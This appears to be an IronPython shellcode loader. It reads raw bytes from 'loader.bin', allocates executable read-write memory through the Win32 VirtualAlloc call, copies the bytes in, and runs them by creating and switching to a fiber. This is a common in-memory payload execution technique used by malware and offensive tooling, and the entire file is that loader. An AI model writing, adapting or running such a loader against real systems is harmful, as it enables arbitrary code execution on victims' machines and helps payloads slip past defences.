import clr
clr.AddReference("System")
import System
clr.AddReference("winapi")
try:
    from  winapi import API
except:
    pass
    
fp = open("loader.bin",'rb').read()

convert = API.Win32.ConvertThreadToFiber(System.IntPtr.zero)

get_len = System.Int32(len(fp))

dword = System.IntPtr.op_Explicit(get_len)

# commit ---> 0x1000
# reserve ----> 0x2000

alloc = API.Win32.VirtualAlloc(System.IntPtr.zero,dword,0x3000,0x40)
movemem = API.Win32.MoveMemory(alloc,fp,len(fp))
fiber = API.Win32.CreateFiber(0,alloc,System.IntPtr.zero)
switch = API.Win32.SwitchToFiber(fiber)
